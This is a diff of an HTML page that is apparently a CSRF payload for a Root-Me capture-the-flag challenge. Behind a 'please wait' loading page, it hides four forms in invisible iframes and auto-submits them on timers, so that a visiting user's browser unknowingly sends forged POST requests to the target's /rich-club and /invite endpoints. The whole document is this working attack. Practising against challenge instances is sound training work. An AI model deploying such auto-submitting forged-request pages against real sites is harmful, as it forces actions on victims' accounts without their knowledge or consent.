@@ -1,27 +1,41 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Chargement...</title>
+</head>
 <body>
-    <h1>Tentative d'invitation multiple...</h1>
+    <h1>Veuillez patienter...</h1>
 
-    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" id="shotgun-form">
-        
+    <iframe name="frame1" style="display:none;"></iframe>
+    <iframe name="frame2" style="display:none;"></iframe>
+    <iframe name="frame3" style="display:none;"></iframe>
+    <iframe name="frame4" style="display:none;"></iframe>
+
+    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" target="frame1" id="f1">
         <input type="hidden" name="username" value="a">
+        <input type="hidden" name="submit" value="1">
+    </form>
+
+    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" target="frame2" id="f2">
         <input type="hidden" name="pseudo" value="a">
-        <input type="hidden" name="user" value="a">
+        <input type="hidden" name="submit" value="1">
+    </form>
 
+    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/rich-club" method="POST" target="frame3" id="f3">
         <input type="hidden" name="email" value="a">
-        <input type="hidden" name="mail" value="a">
-        <input type="hidden" name="recipient" value="a">
-
-        <input type="hidden" name="submit" value="Invite">
-        <input type="hidden" name="invite" value="1">
-        <input type="hidden" name="action" value="invite">
-
+        <input type="hidden" name="submit" value="1">
+    </form>
+    
+    <form action="https://instance-019aa3a1-931e-7190-aef6-941c178a9ba8.challenges.root-me.pro/invite" method="POST" target="frame4" id="f4">
+         <input type="hidden" name="username" value="a">
     </form>
 
     <script>
-        // On envoie le tout
-        document.getElementById('shotgun-form').submit();
+        // On tire tout en même temps
+        setTimeout(function() { document.getElementById('f1').submit(); }, 100);
+        setTimeout(function() { document.getElementById('f2').submit(); }, 500);
+        setTimeout(function() { document.getElementById('f3').submit(); }, 1000);
+        setTimeout(function() { document.getElementById('f4').submit(); }, 1500);
     </script>
 
 </body>
